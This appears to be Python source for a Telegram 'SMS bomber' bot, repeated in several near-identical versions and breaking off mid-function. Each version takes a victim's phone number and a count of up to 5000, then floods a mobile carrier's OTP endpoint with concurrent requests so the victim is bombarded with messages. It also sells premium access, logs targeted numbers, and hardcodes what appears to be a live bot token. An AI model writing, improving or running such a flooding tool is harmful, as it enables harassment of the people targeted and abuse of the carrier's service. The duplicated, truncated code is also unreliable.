import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "users_db.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE LOADING ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return set(json.load(f))
    return {ADMIN_ID}

def save_db(users):
    with open(DB_FILE, "w") as f:
        json.dump(list(users), f)

authorized_users = load_db()

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS (STYLISH) ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Start Attack")
    btn2 = types.KeyboardButton("💎 My Status")
    btn3 = types.KeyboardButton("📊 System Info")
    btn4 = types.KeyboardButton("📞 Support")
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {'state': 'running'}
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            current_state = active_attacks.get(chat_id, {}).get('state')
            if not current_state or current_state == 'stopped': break
            if current_state == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(15, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            # UI Update Logic
            percent = int((stats['total'] / limit) * 100)
            elapsed = int(time.time() - start_time)
            
            try:
                text = (
                    f"⚡ **RK ULTIMATE MONITOR** ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"📊 **Progress:** `{percent}%` [{'🔹'*int(percent/10)}{'▫️'*(10-int(percent/10))}]\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ **Time:** `{elapsed}s` | 📡 **Status:** `{current_state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(current_state), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.5)

    await bot.send_message(chat_id, f"🏁 **Attack Completed!**\nTarget: {number}\nTotal Success: {stats['success']}", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMAND HANDLERS (ALL COMMANDS ADDED) ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    welcome = (
        f"🔥 **RK PREMIUM BOMBER V8** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Hi `{message.from_user.first_name}`, স্বাগতম!\n"
        f"এটি বাংলাদেশের সবচাইতে শক্তিশালী এবং স্টাইলিশ এসএমএস বোম্বার।\n\n"
        f"নিচের মেনু বা `/help` ব্যবহার করে সব কমান্ড দেখুন।"
    )
    await bot.send_message(message.chat.id, welcome, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['help'])
async def cmd_help(message):
    help_text = (
        "🛠 **All Commands List:**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 /attack - বোম্বিং শুরু করুন\n"
        "💎 /status - আপনার সাবস্ক্রিপশন চেক করুন\n"
        "📊 /info - সার্ভারের বর্তমান অবস্থা\n"
        "📞 /support - এডমিনের সাথে যোগাযোগ\n"
        "➕ /add (Admin Only) - ইউজার এড করুন"
    )
    await bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
async def cmd_attack(message):
    if message.chat.id not in authorized_users:
        return await bot.reply_to(message, "❌ **Access Denied!**")
    user_states[message.chat.id] = 'get_num'
    await bot.send_message(message.chat.id, "📞 **টার্গেট নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(commands=['status'])
async def cmd_status(message):
    is_prem = "Premium User 💎" if message.chat.id in authorized_users else "Free User 🆓"
    await bot.reply_to(message, f"👤 **User:** {message.from_user.first_name}\n🆔 **ID:** `{message.chat.id}`\n📊 **Status:** {is_prem}", parse_mode='Markdown')

@bot.message_handler(commands=['info'])
async def cmd_info(message):
    info = f"🖥 **CPU:** {psutil.cpu_percent()}% | **RAM:** {psutil.virtual_memory().percent}% | **Time:** {get_bd_time().strftime('%I:%M %p')}"
    await bot.reply_to(message, info, parse_mode='Markdown')

@bot.message_handler(commands=['support'])
async def cmd_support(message):
    await bot.reply_to(message, "📞 **Contact Admin:** @itzrkraihan")

# --- TEXT MESSAGE LOGIC ---
@bot.message_handler(func=lambda m: True)
async def text_handler(message):
    cid = message.chat.id
    if message.text == "🚀 Start Attack": await cmd_attack(message)
    elif message.text == "💎 My Status": await cmd_status(message)
    elif message.text == "📊 System Info": await cmd_info(message)
    elif message.text == "📞 Support": await cmd_support(message)
    
    # Input States
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(message.text) == 11 and message.text.isdigit():
            user_states[cid] = {'st': 'get_lim', 'n': message.text}
            await bot.send_message(cid, "🔢 **SMS এর সংখ্যা দিন (Max 5000):**")
        else: await bot.reply_to(message, "❌ সঠিক ১১ ডিজিট নম্বর দিন।")
    
    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = min(int(message.text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "⚙️ **ইঞ্জিন লোড হচ্ছে...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
        except: await bot.reply_to(message, "❌ সংখ্যা দিন।")

# --- ADMIN PANEL ---
@bot.message_handler(commands=['add'])
async def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_id = int(message.text.split()[1])
            authorized_users.add(new_id)
            save_db(authorized_users)
            await bot.reply_to(message, f"✅ `{new_id}` এড করা হয়েছে।")
        except: await bot.reply_to(message, "ব্যবহার: `/add ID`")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Action: {call.data}")

if __name__ == "__main__":
    print("RK V8 IS LIVE...")
    asyncio.run(bot.polling(non_stop=True))

import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "rk_database.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE MANAGEMENT ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {"users": [ADMIN_ID], "history": []}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=4)

db_data = load_db()
authorized_users = set(db_data["users"])

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS (STYLISH) ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📜 Attack History"),
        types.KeyboardButton("🔄 Running Attacks"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=8) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit, user_name):
    start_dt = get_bd_time()
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {
        'state': 'running', 
        'target': number, 
        'limit': limit, 
        'start_time': format_time(start_dt)
    }
    
    start_ts = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            current_state = active_attacks.get(chat_id, {}).get('state')
            if not current_state or current_state == 'stopped': break
            if current_state == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(20, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            # Calculations
            percent = int((stats['total'] / limit) * 100)
            elapsed = int(time.time() - start_ts)
            etr = "Calculating..."
            if stats['total'] > 0:
                etr_val = (elapsed / stats['total']) * (limit - stats['total'])
                etr = f"{int(etr_val)}s"

            try:
                text = (
                    f"🔥 **RK MONITOR V10** 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"📊 **Progress:** `{percent}%` [{'🔹'*(percent//10)}{'▫️'*(10-(percent//10))}]\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ **Start:** `{format_time(start_dt)}`\n"
                    f"🕒 **Elapsed:** `{elapsed}s` | **ETR:** `{etr}`\n"
                    f"📡 **Status:** `{current_state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(current_state), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.5)

    # Save to History Database
    history_entry = {
        "user": user_name,
        "target": number,
        "amount": limit,
        "success": stats['success'],
        "date": format_time(get_bd_time())
    }
    db_data["history"].append(history_entry)
    if len(db_data["history"]) > 50: db_data["history"].pop(0) # Keep last 50
    save_db(db_data)

    await bot.send_message(chat_id, f"🏁 **Mission Completed!**\nTarget: {number}\nTotal Success: {stats['success']}\nDate: {format_time(get_bd_time())}", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.send_message(message.chat.id, f"⚡ **RK ULTIMATE V10 IS READY**\n\nWelcome `{message.from_user.first_name}`\nAdmin: @itzrkraihan", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: True)
async def text_handler(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        if cid not in authorized_users: return await bot.reply_to(message, "❌ No Premium Access!")
        user_states[cid] = 'get_num'
        await bot.send_message(cid, "📞 **Target Number:**", reply_markup=types.ReplyKeyboardRemove())

    elif text == "📜 Attack History":
        if not db_data["history"]:
            return await bot.reply_to(message, "📭 No History Found!")
        hist_text = "📜 **LATEST ATTACK HISTORY**\n━━━━━━━━━━━━━━━━━━━━\n"
        for h in db_data["history"][-5:]: # Show last 5
            hist_text += f"📱 `{h['target']}` | 🚀 `{h['amount']}`\n✅ Success: `{h['success']}`\n🕒 `{h['date']}`\n\n"
        await bot.send_message(cid, hist_text, parse_mode='Markdown')

    elif text == "🔄 Running Attacks":
        if not active_attacks:
            return await bot.reply_to(message, "😴 No Active Attacks Currently.")
        run_text = "🔄 **CURRENTLY RUNNING**\n━━━━━━━━━━━━━━━━━━━━\n"
        for uid, data in active_attacks.items():
            run_text += f"📱 Target: `{data['target']}`\n🕒 Started: `{data['start_time']}`\n\n"
        await bot.send_message(cid, run_text, parse_mode='Markdown')

    elif text == "💎 My Status":
        status = "Premium User 💎" if cid in authorized_users else "Free User 🆓"
        await bot.reply_to(message, f"👤 {message.from_user.first_name}\n📊 Status: {status}")

    elif text == "📊 System Info":
        await bot.reply_to(message, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%")

    elif text == "📞 Support":
        await bot.reply_to(message, "Admin: @itzrkraihan")

    # State Handling
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'st': 'get_lim', 'n': text}
            await bot.send_message(cid, "🔢 **SMS Amount (Max 5000):**")
        else: await bot.reply_to(message, "❌ Invalid Number!")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = min(int(text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "⚙️ **Initializing Iron-Frame Engine...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit, message.from_user.first_name))
        except: await bot.reply_to(message, "❌ Error in Limit!")

# --- ADMIN & CALLBACKS ---
@bot.message_handler(commands=['add'])
async def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_id = int(message.text.split()[1])
            db_data["users"].append(new_id)
            authorized_users.add(new_id)
            save_db(db_data)
            await bot.reply_to(message, f"✅ `{new_id}` Added!")
        except: pass

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Action: {call.data}")

if __name__ == "__main__":
    print("RK V10 IS LIVE...")
    asyncio.run(bot.polling(non_stop=True))


import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "users_db.json"
HISTORY_FILE = "attack_history.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE LOADING ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            data = json.load(f)
            return set(data.get("users", [ADMIN_ID])), data.get("all_users", [ADMIN_ID])
    return {ADMIN_ID}, [ADMIN_ID]

def save_db(users, all_users):
    with open(DB_FILE, "w") as f:
        json.dump({"users": list(users), "all_users": list(set(all_users))}, f)

def save_history(entry):
    history = []
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r") as f:
            history = json.load(f)
    history.append(entry)
    with open(HISTORY_FILE, "w") as f:
        json.dump(history[-50:], f) # শেষ ৫০টি হিস্ট্রি সেভ রাখবে

def get_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r") as f:
            return json.load(f)
    return []

authorized_users, all_users = load_db()

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS (STYLISH) ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📜 Attack History"),
        types.KeyboardButton("🔄 Running Attacks"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    start_dt = get_bd_time()
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {
        'state': 'running', 
        'target': number, 
        'start': format_time(start_dt),
        'limit': limit
    }
    start_ts = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            curr = active_attacks.get(chat_id)
            if not curr or curr['state'] == 'stopped': break
            if curr['state'] == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(20, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            percent = int((stats['total'] / limit) * 100)
            elapsed = int(time.time() - start_ts)
            bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
            
            try:
                text = (
                    f"🚀 **RK ULTIMATE MONITOR V10**\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"🕒 **Started:** `{active_attacks[chat_id]['start']}`\n"
                    f"📊 **Progress:** `{percent}%` [{bar}]\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ **Duration:** `{elapsed}s` | 📡 **Status:** `{curr['state'].upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(curr['state']), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.8)

    # Save to History
    history_entry = {
        "target": number,
        "limit": limit,
        "success": stats['success'],
        "time": format_time(get_bd_time()),
        "user": chat_id
    }
    save_history(history_entry)

    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\n📱 Target: `{number}`\n✅ Success: {stats['success']}\n🕒 Time: {history_entry['time']}", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMAND HANDLERS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    if message.chat.id not in all_users:
        all_users.append(message.chat.id)
        save_db(authorized_users, all_users)
    
    await bot.send_message(
        message.chat.id, 
        f"🔥 **RK PREMIUM BOMBER V10** 🔥\n━━━━━━━━━━━━━━━━━━━━\nWelcome `{message.from_user.first_name}`!\nসেরা গতি এবং ফিচারের সাথে বোম্বিং শুরু করুন।",
        reply_markup=main_keyboard(),
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['broadcast'])
async def cmd_broadcast(message):
    if message.from_user.id == ADMIN_ID:
        text = message.text.replace("/broadcast ", "")
        if not text or text == "/broadcast": return await bot.reply_to(message, "মেসেজ লিখুন।")
        
        for user_id in all_users:
            try: await bot.send_message(user_id, f"📢 **ADMIN NOTICE**\n━━━━━━━━━━━━━━\n{text}", parse_mode='Markdown')
            except: continue
        await bot.reply_to(message, "✅ ব্রডকাস্ট সফল!")

# --- UI HANDLERS ---
@bot.message_handler(func=lambda m: True)
async def handle_all(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        if cid not in authorized_users: return await bot.reply_to(message, "❌ Premium Required! Contact @itzrkraihan")
        user_states[cid] = 'get_num'
        await bot.send_message(cid, "📞 **Target Number (11 Digit):**", reply_markup=types.ReplyKeyboardRemove())

    elif text == "💎 My Status":
        status = "Premium 💎" if cid in authorized_users else "Free 🆓"
        await bot.reply_to(message, f"👤 **User:** {message.from_user.first_name}\n📊 **Status:** {status}\n🆔 **ID:** `{cid}`", parse_mode='Markdown')

    elif text == "📊 System Info":
        info = f"🖥 **CPU:** {psutil.cpu_percent()}% | **RAM:** {psutil.virtual_memory().percent}%\n🕒 **Time:** {get_bd_time().strftime('%I:%M %p')}"
        await bot.reply_to(message, info, parse_mode='Markdown')

    elif text == "📜 Attack History":
        hist = get_history()
        if not hist: return await bot.reply_to(message, "হিস্ট্রি খালি!")
        out = "📜 **Recent Attack History**\n━━━━━━━━━━━━━━\n"
        for h in hist[-5:]: # শেষ ৫টি দেখাবে
            out += f"📱 `{h['target']}` | ✅ {h['success']} | 🕒 {h['time']}\n"
        await bot.reply_to(message, out, parse_mode='Markdown')

    elif text == "🔄 Running Attacks":
        if not active_attacks: return await bot.reply_to(message, "বর্তমানে কোনো অ্যাটাক চলছে না।")
        out = "🔄 **Active Mission Monitor**\n━━━━━━━━━━━━━━\n"
        for uid, data in active_attacks.items():
            out += f"👤 User: `{uid}`\n📱 Target: `{data['target']}`\n🕒 Started: `{data['start']}`\n\n"
        await bot.reply_to(message, out, parse_mode='Markdown')

    elif text == "📞 Support":
        await bot.reply_to(message, "📞 **Admin Support:** @itzrkraihan\nযেকোনো সমস্যায় মেসেজ দিন।")

    # Input Logic
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'st': 'get_lim', 'n': text}
            await bot.send_message(cid, "🔢 **SMS Limit (Max 5000):**")
        else: await bot.reply_to(message, "❌ ভুল নম্বর!")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = min(int(text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "🛰 **Initializing God-Speed Engine...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
        except: await bot.reply_to(message, "❌ সংখ্যা দিন।")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Action: {call.data}")

if __name__ == "__main__":
    # Bot Command Menu Registration
    print("RK V10 IS RUNNING...")
    asyncio.run(bot.polling(non_stop=True))
import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "users_db.json"
HISTORY_FILE = "attack_history.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE & HISTORY LOGIC ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return set(json.load(f))
    return {ADMIN_ID}

def save_db(users):
    with open(DB_FILE, "w") as f:
        json.dump(list(users), f)

def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r") as f:
            return json.load(f)
    return []

def save_history(history_data):
    history = load_history()
    history.append(history_data)
    # শুধুমাত্র শেষ ২০টি হিস্টোরি রাখা হবে মেমোরি সেভ করতে
    if len(history) > 20: history.pop(0)
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=4)

authorized_users = load_db()

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS (STYLISH & ADVANCED) ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📜 Attack History"),
        types.KeyboardButton("⏳ Running Tasks"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit, start_time_str):
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {
        'state': 'running',
        'target': number,
        'limit': limit,
        'start_time': start_time_str
    }
    real_start_time = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            current_state = active_attacks.get(chat_id, {}).get('state')
            if not current_state or current_state == 'stopped': break
            if current_state == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(15, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            percent = int((stats['total'] / limit) * 100)
            elapsed = int(time.time() - real_start_time)
            
            try:
                text = (
                    f"⚡ **RK ULTIMATE MONITOR** ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"🕒 **Started At:** `{start_time_str}`\n"
                    f"📊 **Progress:** `{percent}%` [{'🔹'*int(percent/10)}{'▫️'*(10-int(percent/10))}]\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ **Elapsed:** `{elapsed}s` | 📡 **Status:** `{current_state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(current_state), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.8)

    # Save to History
    history_entry = {
        "user_id": chat_id,
        "target": number,
        "limit": limit,
        "success": stats['success'],
        "time": start_time_str,
        "date": get_bd_time().strftime("%d-%m-%Y")
    }
    save_history(history_entry)

    await bot.send_message(chat_id, f"🏁 **Mission Completed!**\nTarget: `{number}`\nTotal Success: `{stats['success']}`", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMAND HANDLERS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    welcome = (
        f"🔥 **RK PREMIUM BOMBER V9** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Hi `{message.from_user.first_name}`, স্বাগতম!\n"
        f"এটি আরকে সিস্টেমের অফিশিয়াল এবং সবচেয়ে অ্যাডভান্সড বোম্বার।"
    )
    await bot.send_message(message.chat.id, welcome, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['add'])
async def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_id = int(message.text.split()[1])
            authorized_users.add(new_id)
            save_db(authorized_users)
            await bot.reply_to(message, f"✅ `{new_id}` এড করা হয়েছে।")
        except: await bot.reply_to(message, "ব্যবহার: `/add ID`")

@bot.message_handler(commands=['broadcast'])
async def broadcast(message):
    if message.from_user.id == ADMIN_ID:
        msg_text = message.text.replace("/broadcast ", "")
        if not msg_text or msg_text == "/broadcast":
            return await bot.reply_to(message, "মেসেজ লিখুন!")
        
        # This will broadcast to all authorized users
        for user in authorized_users:
            try:
                await bot.send_message(user, f"📢 **ADMIN BROADCAST**\n━━━━━━━━━━━━━━\n{msg_text}")
            except: pass

# --- TEXT HANDLERS ---
@bot.message_handler(func=lambda m: True)
async def text_handler(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        if cid not in authorized_users:
            return await bot.reply_to(message, "❌ **Access Denied!**")
        user_states[cid] = 'get_num'
        await bot.send_message(cid, "📞 **টার্গেট নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

    elif text == "📜 Attack History":
        history = load_history()
        if not history:
            return await bot.reply_to(message, "No history found!")
        
        # Show last 5 attacks
        h_text = "📜 **Recent Attacks History**\n━━━━━━━━━━━━━━━━━━━━\n"
        for h in history[-5:]:
            h_text += f"📱 Target: `{h['target']}`\n✅ Success: `{h['success']}`\n🕒 Time: `{h['time']}`\n📅 Date: `{h['date']}`\n━━━━━━━━━━━━━━\n"
        await bot.send_message(cid, h_text, parse_mode='Markdown')

    elif text == "⏳ Running Tasks":
        if not active_attacks:
            return await bot.reply_to(message, "No active attacks running.")
        
